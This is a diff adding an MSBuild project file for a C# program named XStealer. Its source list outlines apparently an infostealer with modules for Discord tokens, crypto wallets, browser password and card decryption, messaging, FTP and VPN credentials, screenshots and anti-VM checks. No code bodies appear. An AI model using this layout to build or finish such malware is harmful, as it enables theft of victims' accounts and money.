@@ -1,0 +1,131 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{751E355F-B066-4547-B13E-B185D9176390}</ProjectGuid>
+    <OutputType>Exe</OutputType>
+    <RootNamespace>XStealer</RootNamespace>
+    <AssemblyName>XStealer</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <LangVersion>preview</LangVersion>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <LangVersion>preview</LangVersion>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>XStealer.Program</StartupObject>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Helpers\Configurations.cs" />
+    <Compile Include="Helpers\ConverterEx.cs" />
+    <Compile Include="Helpers\CounterEx.cs" />
+    <Compile Include="Helpers\DecoderEx.cs" />
+    <Compile Include="Helpers\Enums.cs" />
+    <Compile Include="Helpers\FileX.cs" />
+    <Compile Include="Helpers\GlobalPaths.cs" />
+    <Compile Include="Helpers\JsonEx\JavaScriptReader.cs" />
+    <Compile Include="Helpers\JsonEx\JsonArray.cs" />
+    <Compile Include="Helpers\JsonEx\JsonExt.cs" />
+    <Compile Include="Helpers\JsonEx\JsonObject.cs" />
+    <Compile Include="Helpers\JsonEx\JsonPrimitive.cs" />
+    <Compile Include="Helpers\JsonEx\JsonValue.cs" />
+    <Compile Include="Helpers\Logger.cs" />
+    <Compile Include="Helpers\MutEx.cs" />
+    <Compile Include="Helpers\NativeMethods.cs" />
+    <Compile Include="Helpers\Privilegies.cs" />
+    <Compile Include="Helpers\ProcessEx.cs" />
+    <Compile Include="Helpers\RndEx.cs" />
+    <Compile Include="Helpers\SafeScan.cs" />
+    <Compile Include="Helpers\Structures.cs" />
+    <Compile Include="Helpers\WhiteRabbit.cs" />
+    <Compile Include="Modules\Apps\Discord\Storage.cs" />
+    <Compile Include="Modules\Apps\Discord\Tokens.cs" />
+    <Compile Include="Modules\Apps\DynDns.cs" />
+    <Compile Include="Modules\Apps\FilesCollector.cs" />
+    <Compile Include="Modules\Apps\FileZilla.cs" />
+    <Compile Include="Modules\Apps\FoxMail.cs" />
+    <Compile Include="Modules\Apps\Pidgin.cs" />
+    <Compile Include="Modules\Apps\Steam\SteamConverter.cs" />
+    <Compile Include="Modules\Apps\Steam\SteamFiles.cs" />
+    <Compile Include="Modules\Apps\Steam\SteamPath.cs" />
+    <Compile Include="Modules\Apps\Steam\SteamProfiles.cs" />
+    <Compile Include="Modules\Apps\Telegram.cs" />
+    <Compile Include="Modules\Apps\Vpn\NordVpn.cs" />
+    <Compile Include="Modules\Apps\Vpn\OpenVpn.cs" />
+    <Compile Include="Modules\Apps\Vpn\ProtonVpn.cs" />
+    <Compile Include="Modules\Apps\Wallets\CryptoWallets.cs" />
+    <Compile Include="Modules\Apps\Wallets\ExtensionWallets.cs" />
+    <Compile Include="Modules\Browsers\Chromium\AesGcmEx.cs" />
+    <Compile Include="Modules\Browsers\Chromium\BCrypt.cs" />
+    <Compile Include="Modules\Browsers\Chromium\CBox.cs" />
+    <Compile Include="Modules\Browsers\Chromium\CBrowserPaths.cs" />
+    <Compile Include="Modules\Browsers\Chromium\CDataStruct.cs" />
+    <Compile Include="Modules\Browsers\Chromium\CEngine.cs" />
+    <Compile Include="Modules\Browsers\Chromium\CFormatLog.cs" />
+    <Compile Include="Modules\Browsers\Chromium\CreditsParser.cs" />
+    <Compile Include="Modules\Browsers\Chromium\ParserBook.cs" />
+    <Compile Include="Modules\Browsers\Gecko\Asn1Der.cs" />
+    <Compile Include="Modules\Browsers\Gecko\Asn1DerObject.cs" />
+    <Compile Include="Modules\Browsers\Gecko\BerkeleyDB.cs" />
+    <Compile Include="Modules\Browsers\Gecko\GBox.cs" />
+    <Compile Include="Modules\Browsers\Gecko\GBrowserPaths.cs" />
+    <Compile Include="Modules\Browsers\Gecko\GDataStruct.cs" />
+    <Compile Include="Modules\Browsers\Gecko\GEngine.cs" />
+    <Compile Include="Modules\Browsers\Gecko\GFormatLog.cs" />
+    <Compile Include="Modules\Browsers\Gecko\MozillaPBE.cs" />
+    <Compile Include="Modules\Browsers\Gecko\PasswordCheck.cs" />
+    <Compile Include="Modules\Browsers\SqliteEx.cs" />
+    <Compile Include="Modules\Browsers\UserAgents.cs" />
+    <Compile Include="Modules\Machine\BufferEx.cs" />
+    <Compile Include="Modules\Machine\CheckContry.cs" />
+    <Compile Include="Modules\Machine\CheckVirtual.cs" />
+    <Compile Include="Modules\Machine\CountryUser.cs" />
+    <Compile Include="Modules\Machine\Hwid.cs" />
+    <Compile Include="Modules\Machine\InfoEx.cs" />
+    <Compile Include="Modules\Machine\PacketBrowsers.cs" />
+    <Compile Include="Modules\Machine\ProcessInfo.cs" />
+    <Compile Include="Modules\Apps\RDPacket.cs" />
+    <Compile Include="Modules\Machine\ScreenShot.cs" />
+    <Compile Include="Modules\Machine\Uac.cs" />
+    <Compile Include="Modules\Machine\WifiEx.cs" />
+    <Compile Include="Modules\Machine\WmiEx.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="ZipEx.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
